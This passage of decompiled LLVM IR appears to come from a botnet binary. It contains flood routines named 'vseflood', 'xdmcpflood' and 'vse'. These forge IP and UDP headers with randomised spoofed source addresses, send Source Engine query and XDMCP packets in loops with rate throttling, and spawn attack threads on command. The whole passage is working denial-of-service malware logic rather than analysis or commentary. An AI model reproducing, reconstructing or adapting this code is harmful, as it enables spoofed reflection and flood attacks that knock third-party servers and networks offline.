  br label %dec_label_pc_dc64

dec_label_pc_dc64:                                ; preds = %dec_label_pc_dc24, %dec_label_pc_dc5c
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_dc24 ], [ 0, %dec_label_pc_dc5c ]
  %v1_dc68 = add i32 %stack_var_-24.1, 1
  store i32 %v1_dc68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dc24

dec_label_pc_dc74:                                ; preds = %dec_label_pc_daf0
  %v1_dc78 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_dc7c

dec_label_pc_dc7c:                                ; preds = %entry, %dec_label_pc_dc74
  %v1_dc88 = phi i32 [ %v1_d868, %entry ], [ %v1_dc78, %dec_label_pc_dc74 ]
  ret i32 %v1_dc88

; uselistorder directives
  uselistorder i32 %v1_dc68, { 1, 0 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2 }
  uselistorder i32 %v1_dbec, { 1, 0 }
  uselistorder i32 %v2_dbd4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_dad8, { 2, 1, 0 }
  uselistorder i32 %v2_da60, { 3, 2, 0, 1 }
  uselistorder i32 %v2_da38, { 1, 0, 2, 3 }
  uselistorder i32 %v2_da34, { 1, 0 }
  uselistorder i32 %storemerge138, { 3, 0, 2, 1 }
  uselistorder i32 %v3_d99c, { 1, 0 }
  uselistorder i32 %v1_d910, { 1, 0 }
  uselistorder i32 %v1_d8d8, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %v2_d858, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 9, 12, 13, 14, 15, 16, 17, 20, 18, 19, 37, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 13, 11, 12, 16, 14, 15, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_dc7c, { 1, 0 }
  uselistorder label %dec_label_pc_dc64, { 1, 0 }
  uselistorder label %dec_label_pc_dc5c, { 1, 0 }
  uselistorder label %dec_label_pc_dc18, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_da24, { 1, 0 }
  uselistorder label %dec_label_pc_d8c8, { 1, 0 }
  uselistorder label %dec_label_pc_d8a4, { 1, 0 }
}

define i32 @setup_vse_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_dca8 = load i32, i32* @r4, align 4
  %v6_dca8 = load i32, i32* @r5, align 4
  store i32 56496, i32* %stack_var_-4, align 4
  %v2_dcac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dcac, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_dd08 = add i32 %tmp, 1
  %v4_dd08 = inttoptr i32 %v3_dd08 to i8*
  store i8 0, i8* %v4_dd08, align 1
  %v3_dd14 = add i32 %tmp, 2
  %v4_dd14 = inttoptr i32 %v3_dd14 to i16*
  store i16 53, i16* %v4_dd14, align 2
  %v1_dd20 = call i32 @__GI_htonl(i32 54321)
  %v1_dd34 = trunc i32 %v1_dd20 to i16
  %v3_dd34 = add i32 %tmp, 4
  %v4_dd34 = inttoptr i32 %v3_dd34 to i16*
  store i16 %v1_dd34, i16* %v4_dd34, align 2
  %v3_dd40 = add i32 %tmp, 6
  %v4_dd40 = inttoptr i32 %v3_dd40 to i16*
  store i16 0, i16* %v4_dd40, align 2
  %v3_dd4c = add i32 %tmp, 8
  %v4_dd4c = inttoptr i32 %v3_dd4c to i8*
  store i8 -1, i8* %v4_dd4c, align 1
  %v3_dd58 = add i32 %tmp, 9
  %v4_dd58 = inttoptr i32 %v3_dd58 to i8*
  store i8 17, i8* %v4_dd58, align 1
  %v3_dd64 = add i32 %tmp, 10
  %v4_dd64 = inttoptr i32 %v3_dd64 to i16*
  store i16 0, i16* %v4_dd64, align 2
  %v2_dd70 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_dd70, i32* @r6, align 4
  %v2_dd80 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_dd80, i32* @r4, align 4
  %v2_dd90 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_dd90, i32* @r5, align 4
  %v2_dda0 = call i32 @realrand(i32 1, i32 255)
  %v2_dda8 = ptrtoint i32* %stack_var_-49 to i32
  %v0_ddac = load i32, i32* @r4, align 4
  %v0_ddb0 = load i32, i32* @r5, align 4
  store i32 %v2_dda8, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v0_ddc4 = load i32, i32* @r6, align 4
  %v8_ddc8 = call i32 @__GI_snprintf(i32 %v2_dda8, i32 16, i32 ptrtoint ([12 x i8]* @global_var_375a8.359 to i32), i32 %v0_ddc4, i32 %v0_ddac, i32 %v0_ddb0, i32 %v2_dda0)
  store i32 %v2_dda8, i32* @r0, align 4
  %v1_ddd4 = call i32 @inet_addr(i32 %v2_dda8)
  %v2_dde0 = add i32 %tmp, 12
  %v3_dde0 = inttoptr i32 %v2_dde0 to i32*
  store i32 %v1_ddd4, i32* %v3_dde0, align 4
  store i32 %v3_dca8, i32* @r4, align 4
  store i32 %v6_dca8, i32* @r5, align 4
  ret i32 %v1_ddd4

; uselistorder directives
  uselistorder i32 %v2_dda8, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @setup_vse_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_ddf4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_ddf4, i32* @ip, align 4
  %v1_de10 = call i32 @__GI_htons(i32 27015)
  %sext = mul i32 %v1_de10, 65536
  %v1_de14 = sdiv i32 %sext, 65536
  %v1_de20 = trunc i32 %v1_de14 to i16
  store i16 %v1_de20, i16* %arg1, align 2
  %v1_de2c = call i32 @__GI_htons(i32 27015)
  %v1_de3c = trunc i32 %v1_de2c to i16
  %v3_de3c = add i32 %tmp, 2
  %v4_de3c = inttoptr i32 %v3_de3c to i16*
  store i16 %v1_de3c, i16* %v4_de3c, align 2
  %v3_de48 = add i32 %tmp, 6
  %v4_de48 = inttoptr i32 %v3_de48 to i16*
  store i16 0, i16* %v4_de48, align 2
  %v1_de50 = add i32 %tmp, 8
  store i32 %v1_de50, i32* @r0, align 4
  store i32 255, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_de64 = call i32 @__GI_memset()
  %v1_de6c = add i32 %tmp, 12
  store i32 %v1_de6c, i32* @r3, align 4
  store i32 %v1_de6c, i32* @r0, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_37640.382 to i32), i32* @r1, align 4
  store i32 21, i32* @r2, align 4
  %v0_de7c = call i32 @memcpy()
  %v1_de84 = call i32 @__GI_htons(i32 33)
  %v2_de84 = trunc i32 %v1_de84 to i16
  %v3_de94 = add i32 %tmp, 4
  %v4_de94 = inttoptr i32 %v3_de94 to i16*
  store i16 %v2_de84, i16* %v4_de94, align 2
  ret i32 %v1_de84

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1, 3, 4 }
}

define i32 @vseflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4160 = alloca i32, align 4
  %stack_var_-4152 = alloca i32, align 4
  %stack_var_-4156 = alloca i32, align 4
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 57012, i32* %stack_var_-4, align 4
  %v2_deb0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_deb0, i32* @fp, align 4
  %v2_dee8 = ptrtoint i32* %stack_var_-4140 to i32
  %v1_def4 = add i32 %v2_dee8, 20
  store i32 2, i32* %stack_var_-4156, align 4
  %v1_df18 = call i32 @__GI_htons(i32 17015)
  store i32 %arg1, i32* @r0, align 4
  %v1_df44 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_df44, i32* %stack_var_-4152, align 4
  %v3_df74 = call i32 @socket(i32 2, i32 3, i32 17)
  %v1_df84 = icmp slt i32 %v3_df74, 0
  br i1 %v1_df84, label %dec_label_pc_df8c, label %dec_label_pc_df94

dec_label_pc_df8c:                                ; preds = %entry
  %v1_df90 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_df94

dec_label_pc_df94:                                ; preds = %entry, %dec_label_pc_df8c
  store i32 %v2_dee8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_dfac = call i32 @__GI_memset()
  %v1_dfb4 = bitcast i32* %stack_var_-4140 to i8*
  %v2_dfb4 = call i32 @setup_vse_ip_header(i8* %v1_dfb4)
  %v1_dfbc = inttoptr i32 %v1_def4 to i16*
  %v2_dfbc = call i32 @setup_vse_header(i16* %v1_dfbc)
  %v2_dfd8 = load i32, i32* %stack_var_-4152, align 4
  %v2_dfe0 = add i32 %v2_dee8, 16
  %v3_dfe0 = inttoptr i32 %v2_dfe0 to i32*
  store i32 %v2_dfd8, i32* %v3_dfe0, align 4
  %v1_dff4 = or i32 %v2_dee8, 2
  %v2_dff4 = inttoptr i32 %v1_dff4 to i16*
  %v3_dff4 = load i16, i16* %v2_dff4, align 2
  %v4_dff4 = zext i16 %v3_dff4 to i32
  %v2_e000 = bitcast i32* %stack_var_-4140 to i16*
  %v3_e000 = call i32 @csum(i16* %v2_e000, i32 %v4_dff4)
  %v1_e010 = trunc i32 %v3_e000 to i16
  %v3_e010 = add i32 %v2_dee8, 10
  %v4_e010 = inttoptr i32 %v3_e010 to i16*
  store i16 %v1_e010, i16* %v4_e010, align 2
  store i32 1, i32* %stack_var_-4160, align 4
  %v2_e030 = ptrtoint i32* %stack_var_-4160 to i32
  %v5_e050 = call i32 @__GI_setsockopt(i32 %v3_df74, i32 0, i32 3, i32 %v2_e030, i32 4)
  %v1_e058 = icmp slt i32 %v5_e050, 0
  br i1 %v1_e058, label %dec_label_pc_e060, label %dec_label_pc_e068

dec_label_pc_e060:                                ; preds = %dec_label_pc_df94
  %v1_e064 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_e068

dec_label_pc_e068:                                ; preds = %dec_label_pc_df94, %dec_label_pc_e060
  %v2_e06c = call i32 @__GI_time(i32* null)
  %v1_e078 = call i32 @init_rand(i32 %v2_e06c)
  %v2_e09c = ptrtoint i32* %stack_var_-4156 to i32
  %v2_e124 = add i32 %v2_dee8, 12
  %v3_e124 = inttoptr i32 %v2_e124 to i32*
  %v3_e148 = add i32 %v2_dee8, 4
  %v4_e148 = inttoptr i32 %v3_e148 to i16*
  br label %dec_label_pc_e088

dec_label_pc_e088:                                ; preds = %dec_label_pc_e1c4, %dec_label_pc_e068
  %storemerge = phi i32 [ %v1_e1cc, %dec_label_pc_e1c4 ], [ 0, %dec_label_pc_e068 ]
  %v3_e08c = load i16, i16* %v2_dff4, align 2
  %v4_e08c = zext i16 %v3_e08c to i32
  %v6_e0c8 = call i32 @sendto(i32 %v3_df74, i32 %v2_dee8, i32 %v4_e08c, i32 0, i32 %v2_e09c, i32 16)
  %v0_e0cc = call i32 @rand_cmwc()
  %v3_e0d4 = urem i32 %v0_e0cc, 16777216
  %v3_e0dc = sub i32 %v0_e0cc, %v3_e0d4
  store i32 %v3_e0dc, i32* @r4, align 4
  %v0_e0e0 = call i32 @rand_cmwc()
  %v1_e0ec = and i32 %v0_e0e0, 16711680
  %v0_e0f4 = load i32, i32* @r4, align 4
  %v2_e0f4 = or i32 %v0_e0f4, %v1_e0ec
  store i32 %v2_e0f4, i32* @r4, align 4
  %v0_e0f8 = call i32 @rand_cmwc()
  %v1_e104 = and i32 %v0_e0f8, 65280
  %v0_e10c = load i32, i32* @r4, align 4
  %v2_e10c = or i32 %v0_e10c, %v1_e104
  store i32 %v2_e10c, i32* @r4, align 4
  %v0_e110 = call i32 @rand_cmwc()
  %v1_e118 = urem i32 %v0_e110, 256
  %v0_e11c = load i32, i32* @r4, align 4
  %v2_e11c = or i32 %v0_e11c, %v1_e118
  store i32 %v2_e11c, i32* %v3_e124, align 4
  %v0_e128 = call i32 @rand_cmwc()
  %v1_e134 = call i32 @__GI_htonl(i32 %v0_e128)
  %v1_e148 = trunc i32 %v1_e134 to i16
  store i16 %v1_e148, i16* %v4_e148, align 4
  %v3_e15c = load i16, i16* %v2_dff4, align 2
  %v4_e15c = zext i16 %v3_e15c to i32
  %v3_e168 = call i32 @csum(i16* %v2_e000, i32 %v4_e15c)
  %v1_e178 = trunc i32 %v3_e168 to i16
  store i16 %v1_e178, i16* %v4_e010, align 2
  %v2_e180 = load i32, i32* @global_var_526bc.176, align 4
  %v1_e184 = add i32 %v2_e180, 1
  store i32 %v1_e184, i32* @global_var_526bc.176, align 4
  %v2_e194 = load i32, i32* @global_var_52590.178, align 4
  %tmp = icmp ugt i32 %v2_e194, %storemerge
  br i1 %tmp, label %dec_label_pc_e1c4, label %dec_label_pc_e1a8

dec_label_pc_e1a8:                                ; preds = %dec_label_pc_e088
  %v2_e1b8 = load i32, i32* @global_var_4535c.180, align 4
  %v1_e1c0 = call i32 @usleep(i32 %v2_e1b8)
  br label %dec_label_pc_e1c4

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e088, %dec_label_pc_e1a8
  %stack_var_-4168.0 = phi i32 [ %storemerge, %dec_label_pc_e088 ], [ 0, %dec_label_pc_e1a8 ]
  %v1_e1cc = add i32 %stack_var_-4168.0, 1
  br label %dec_label_pc_e088

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_dee8, { 5, 1, 2, 3, 0, 4, 6, 7 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-4140, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4156, { 1, 0 }
  uselistorder i32* %stack_var_-4160, { 1, 0 }
  uselistorder label %dec_label_pc_e1c4, { 1, 0 }
  uselistorder label %dec_label_pc_e068, { 1, 0 }
  uselistorder label %dec_label_pc_df94, { 1, 0 }
}

define i32 @vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  store i32 57844, i32* %stack_var_-4, align 4
  %v2_e1f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e1f0, i32* @fp, align 4
  %v2_e214 = call i32 @__GI_time(i32* null)
  %v1_e224 = call i32 @mfork(i32 %arg2)
  %v2_e22c = icmp eq i32 %v1_e224, 0
  br i1 %v2_e22c, label %dec_label_pc_e234, label %dec_label_pc_e514

dec_label_pc_e234:                                ; preds = %entry
  %v3_e240 = call i32 @socket(i32 2, i32 3, i32 255)
  %v1_e250 = icmp slt i32 %v3_e240, 0
  br i1 %v1_e250, label %dec_label_pc_e258, label %dec_label_pc_e260

dec_label_pc_e258:                                ; preds = %dec_label_pc_e234
  %v1_e25c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_e260

dec_label_pc_e260:                                ; preds = %dec_label_pc_e234, %dec_label_pc_e258
  %v8_e268 = icmp sgt i32 %arg3, 3
  br i1 %v8_e268, label %dec_label_pc_e284, label %dec_label_pc_e26c

dec_label_pc_e26c:                                ; preds = %dec_label_pc_e260
  store i32 %arg2, i32* @r2, align 4
  %v3_e278 = call i32 @Send(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_37658.387 to i32))
  %v1_e280 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_e284

dec_label_pc_e284:                                ; preds = %dec_label_pc_e260, %dec_label_pc_e26c
  %v1_e288 = add i32 %arg4, 8
  %v1_e28c = inttoptr i32 %v1_e288 to i32*
  %v2_e28c = load i32, i32* %v1_e28c, align 4
  store i32 %v2_e28c, i32* @r0, align 4
  %v1_e294 = call i32 @atol(i32 %v2_e28c)
  %v1_e2a4 = add i32 %arg4, 12
  %v1_e2a8 = inttoptr i32 %v1_e2a4 to i32*
  %v2_e2a8 = load i32, i32* %v1_e2a8, align 4
  store i32 %v2_e2a8, i32* @r0, align 4
  %v1_e2b0 = call i32 @atol(i32 %v2_e2a8)
  %v1_e2c0 = add i32 %arg4, 16
  %v1_e2c4 = inttoptr i32 %v1_e2c0 to i32*
  %v2_e2c4 = load i32, i32* %v1_e2c4, align 4
  store i32 %v2_e2c4, i32* @r0, align 4
  %v1_e2cc = call i32 @atol(i32 %v2_e2c4)
  store i32 0, i32* @global_var_52590.178, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  %v3_e2f4 = mul i32 %v1_e294, 4
  %v1_e2fc = add i32 %v3_e2f4, 14
  %v3_e300 = and i32 %v1_e2fc, -8
  %v1_e308 = load i32, i32* @sp, align 4
  %v2_e308 = sub i32 %v1_e308, %v3_e300
  %v1_e314 = add i32 %v2_e308, 7
  %v3_e318 = and i32 %v1_e314, -8
  %v1_e354 = add i32 %arg4, 4
  %v1_e358 = inttoptr i32 %v1_e354 to i32*
  %v5_e38428 = icmp sgt i32 %v1_e294, 0
  br i1 %v5_e38428, label %dec_label_pc_e340, label %dec_label_pc_e388

dec_label_pc_e340:                                ; preds = %dec_label_pc_e284, %dec_label_pc_e340
  %storemerge129 = phi i32 [ %v1_e370, %dec_label_pc_e340 ], [ 0, %dec_label_pc_e284 ]
  %v3_e348 = mul i32 %storemerge129, 4
  %v2_e34c = add i32 %v3_e348, %v3_e318
  %v2_e358 = load i32, i32* %v1_e358, align 4
  %v4_e368 = inttoptr i32 %v2_e34c to i32*
  %v5_e368 = call i32 @pthread_create(i32* %v4_e368, i32 0, i32 ptrtoint (i32* @global_var_dea8.391 to i32), i32 %v2_e358)
  %v1_e370 = add nuw nsw i32 %storemerge129, 1
  %v5_e384 = icmp slt i32 %v1_e370, %v1_e294
  br i1 %v5_e384, label %dec_label_pc_e340, label %dec_label_pc_e388

dec_label_pc_e388:                                ; preds = %dec_label_pc_e340, %dec_label_pc_e284
  store i32 %arg2, i32* @r2, align 4
  %v3_e3a0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_376b4.393 to i32))
  %v2_e3b4 = load i32, i32* %v1_e2c4, align 4
  store i32 %v2_e3b4, i32* @r0, align 4
  %v1_e3bc = call i32 @atol(i32 %v2_e3b4)
  %v2_e3c8 = mul i32 %v1_e3bc, 20
  %v7_e3d4 = icmp sgt i32 %v2_e3c8, 0
  br i1 %v7_e3d4, label %dec_label_pc_e3d8, label %dec_label_pc_e50c

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e388
  %v1_e408 = call i32 @usleep(i32 50000)
  %v2_e410 = load i32, i32* @global_var_526bc.176, align 4
  %v2_e418 = mul i32 %v2_e410, 20
  %tmp30 = icmp ugt i32 %v2_e418, %v1_e2b0
  %v2_e46c = load i32, i32* @global_var_52590.178, align 4
  br i1 %tmp30, label %dec_label_pc_e428, label %dec_label_pc_e468

dec_label_pc_e428:                                ; preds = %dec_label_pc_e3d8
  %v5_e434 = icmp sgt i32 %v2_e46c, 0
  br i1 %v5_e434, label %dec_label_pc_e450, label %dec_label_pc_e438

dec_label_pc_e438:                                ; preds = %dec_label_pc_e428
  %v2_e43c = load i32, i32* @global_var_4535c.180, align 4
  %v1_e440 = add i32 %v2_e43c, 100
  store i32 %v1_e440, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_e4b0

dec_label_pc_e450:                                ; preds = %dec_label_pc_e428
  %v1_e458 = add i32 %v2_e46c, -1
  store i32 %v1_e458, i32* @global_var_52590.178, align 4
  br label %dec_label_pc_e4b0

dec_label_pc_e468:                                ; preds = %dec_label_pc_e3d8
  %v1_e470 = add i32 %v2_e46c, 1
  store i32 %v1_e470, i32* @global_var_52590.178, align 4
  %v2_e480 = load i32, i32* @global_var_4535c.180, align 4
  %tmp31 = icmp ult i32 %v2_e480, 26
  br i1 %tmp31, label %dec_label_pc_e4a4, label %dec_label_pc_e48c

dec_label_pc_e48c:                                ; preds = %dec_label_pc_e468
  %v1_e484 = add i32 %v2_e480, -25
  store i32 %v1_e484, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_e4b0

dec_label_pc_e4a4:                                ; preds = %dec_label_pc_e468
  store i32 0, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_e4b0

dec_label_pc_e4b0:                                ; preds = %dec_label_pc_e48c, %dec_label_pc_e450, %dec_label_pc_e438, %dec_label_pc_e4a4
  store i32 0, i32* @global_var_526bc.176, align 4
  %v2_e4e0 = add i32 %v1_e2cc, %v2_e214
  br label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e4fc, %dec_label_pc_e4b0
  %stack_var_-24.0 = phi i32 [ %tmp, %dec_label_pc_e4b0 ], [ %v1_e500, %dec_label_pc_e4fc ]
  %v7_e4c4 = icmp slt i32 %stack_var_-24.0, 100
  br i1 %v7_e4c4, label %dec_label_pc_e4fc, label %dec_label_pc_e4c8

dec_label_pc_e4c8:                                ; preds = %dec_label_pc_e4bc
  %v2_e4cc = call i32 @__GI_time(i32* null)
  %v3_e4e4 = icmp ult i32 %v2_e4cc, %v2_e4e0
  br i1 %v3_e4e4, label %dec_label_pc_e4f4, label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e4c8
  %v1_e4f0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_e4f4

dec_label_pc_e4f4:                                ; preds = %dec_label_pc_e4c8, %dec_label_pc_e4ec
  br label %dec_label_pc_e4fc

dec_label_pc_e4fc:                                ; preds = %dec_label_pc_e4bc, %dec_label_pc_e4f4
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_e4bc ], [ 0, %dec_label_pc_e4f4 ]
  %v1_e500 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_e4bc

dec_label_pc_e50c:                                ; preds = %dec_label_pc_e388
  %v1_e510 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %entry, %dec_label_pc_e50c
  %v1_e520 = phi i32 [ %v1_e224, %entry ], [ %v1_e510, %dec_label_pc_e50c ]
  ret i32 %v1_e520

; uselistorder directives
  uselistorder i32 %v2_e480, { 1, 0 }
  uselistorder i32 %v2_e46c, { 2, 0, 1 }
  uselistorder i32 %v1_e370, { 1, 0 }
  uselistorder i32 %storemerge129, { 1, 0 }
  uselistorder i32 %v1_e294, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_e514, { 1, 0 }
  uselistorder label %dec_label_pc_e4fc, { 1, 0 }
  uselistorder label %dec_label_pc_e4f4, { 1, 0 }
  uselistorder label %dec_label_pc_e4b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e340, { 1, 0 }
  uselistorder label %dec_label_pc_e284, { 1, 0 }
  uselistorder label %dec_label_pc_e260, { 1, 0 }
}

define i32 @setup_xdmcp_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v3_e5a0 = add i32 %tmp, 1
  %v4_e5a0 = inttoptr i32 %v3_e5a0 to i8*
  store i8 0, i8* %v4_e5a0, align 1
  %v3_e5ac = add i32 %tmp, 2
  %v4_e5ac = inttoptr i32 %v3_e5ac to i16*
  store i16 35, i16* %v4_e5ac, align 2
  %v1_e5b8 = call i32 @__GI_htonl(i32 54321)
  %v1_e5cc = trunc i32 %v1_e5b8 to i16
  %v3_e5cc = add i32 %tmp, 4
  %v4_e5cc = inttoptr i32 %v3_e5cc to i16*
  store i16 %v1_e5cc, i16* %v4_e5cc, align 2
  %v3_e5d8 = add i32 %tmp, 6
  %v4_e5d8 = inttoptr i32 %v3_e5d8 to i16*
  store i16 0, i16* %v4_e5d8, align 2
  %v3_e5e4 = add i32 %tmp, 8
  %v4_e5e4 = inttoptr i32 %v3_e5e4 to i8*
  store i8 -1, i8* %v4_e5e4, align 1
  %v3_e5f0 = add i32 %tmp, 9
  %v4_e5f0 = inttoptr i32 %v3_e5f0 to i8*
  store i8 17, i8* %v4_e5f0, align 1
  %v3_e5fc = add i32 %tmp, 10
  %v4_e5fc = inttoptr i32 %v3_e5fc to i16*
  store i16 0, i16* %v4_e5fc, align 2
  store i32 ptrtoint ([14 x i8]* @global_var_36ff0.153 to i32), i32* @r0, align 4
  %v2_e604 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_36ff0.153 to i32))
  %v2_e610 = add i32 %tmp, 12
  %v3_e610 = inttoptr i32 %v2_e610 to i32*
  store i32 %v2_e604, i32* %v3_e610, align 4
  ret i32 %v2_e604
}

define i32 @setup_xdmcp_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_e624 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e624, i32* @ip, align 4
  %v1_e640 = call i32 @__GI_htons(i32 5678)
  %sext = mul i32 %v1_e640, 65536
  %v1_e644 = sdiv i32 %sext, 65536
  %v1_e650 = trunc i32 %v1_e644 to i16
  store i16 %v1_e650, i16* %arg1, align 2
  %v1_e658 = call i32 @__GI_htons(i32 177)
  %v1_e668 = trunc i32 %v1_e658 to i16
  %v3_e668 = add i32 %tmp, 2
  %v4_e668 = inttoptr i32 %v3_e668 to i16*
  store i16 %v1_e668, i16* %v4_e668, align 2
  %v3_e674 = add i32 %tmp, 6
  %v4_e674 = inttoptr i32 %v3_e674 to i16*
  store i16 0, i16* %v4_e674, align 2
  %v1_e67c = add i32 %tmp, 8
  store i32 %v1_e67c, i32* @r3, align 4
  store i32 %v1_e67c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_376d4.397 to i32), i32* @r1, align 4
  store i32 7, i32* @r2, align 4
  %v0_e68c = call i32 @memcpy()
  %v1_e694 = call i32 @__GI_htons(i32 15)
  %v2_e694 = trunc i32 %v1_e694 to i16
  %v3_e6a4 = add i32 %tmp, 4
  %v4_e6a4 = inttoptr i32 %v3_e6a4 to i16*
  store i16 %v2_e694, i16* %v4_e6a4, align 2
  ret i32 %v1_e694
}

define i32 @xdmcpflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4156 = alloca i32, align 4
  %stack_var_-4136 = alloca i32, align 4
  %v2_e6f8 = ptrtoint i32* %stack_var_-4136 to i32
  %v1_e704 = add i32 %v2_e6f8, 20
  %v5_e708 = inttoptr i32 %v1_e704 to i16*
  %v3_e724 = add i32 %arg1, 12
  %v4_e724 = inttoptr i32 %v3_e724 to i32*
  %v5_e724 = load i32, i32* %v4_e724, align 4
  %v1_e730 = add i32 %arg1, 4
  %v2_e730 = inttoptr i32 %v1_e730 to i32*
  %v3_e730 = load i32, i32* %v2_e730, align 4
  %v3_e744 = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_e754 = icmp slt i32 %v3_e744, 0
  br i1 %v1_e754, label %dec_label_pc_e75c, label %dec_label_pc_e764

dec_label_pc_e75c:                                ; preds = %entry
  %v1_e760 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_e764

dec_label_pc_e764:                                ; preds = %entry, %dec_label_pc_e75c
  %v2_e768 = call i32 @__GI_time(i32* null)
  %v1_e774 = call i32 @init_rand(i32 %v2_e768)
  store i32 %v2_e6f8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_e790 = call i32 @__GI_memset()
  %v1_e798 = bitcast i32* %stack_var_-4136 to i8*
  %v2_e798 = call i32 @setup_xdmcp_ip_header(i8* %v1_e798)
  %v2_e7a0 = call i32 @setup_xdmcp_udp_header(i16* %v5_e708)
  %v0_e7a4 = call i32 @rand()
  %v2_e7c4 = sdiv i32 %v0_e7a4, 13107
  %tmp33 = mul i32 %v2_e7c4, -65535
  %v2_e7e8 = add i32 %tmp33, %v0_e7a4
  %fold = add i32 %v2_e7e8, 64510
  %v3_e810 = urem i32 %fold, 65536
  %v1_e818 = call i32 @__GI_htons(i32 %v3_e810)
  %v1_e828 = trunc i32 %v1_e818 to i16
  store i16 %v1_e828, i16* %v5_e708, align 4
  %v2_e84c = add i32 %v2_e6f8, 12
  %v3_e84c = inttoptr i32 %v2_e84c to i32*
  store i32 %v5_e724, i32* %v3_e84c, align 4
  %v1_e854 = add i32 %v3_e730, 4
  %v2_e854 = inttoptr i32 %v1_e854 to i32*
  %v3_e854 = load i32, i32* %v2_e854, align 4
  %v2_e85c = add i32 %v2_e6f8, 16
  %v3_e85c = inttoptr i32 %v2_e85c to i32*
  store i32 %v3_e854, i32* %v3_e85c, align 4
  %v1_e870 = or i32 %v2_e6f8, 2
  %v2_e870 = inttoptr i32 %v1_e870 to i16*
  %v3_e870 = load i16, i16* %v2_e870, align 2
  %div = udiv i16 %v3_e870, 2
  %v3_e874 = zext i16 %div to i32
  %v2_e888 = bitcast i32* %stack_var_-4136 to i16*
  %v3_e888 = call i32 @csum(i16* %v2_e888, i32 %v3_e874)
  %v1_e898 = trunc i32 %v3_e888 to i16
  %v3_e898 = add i32 %v2_e6f8, 10
  %v4_e898 = inttoptr i32 %v3_e898 to i16*
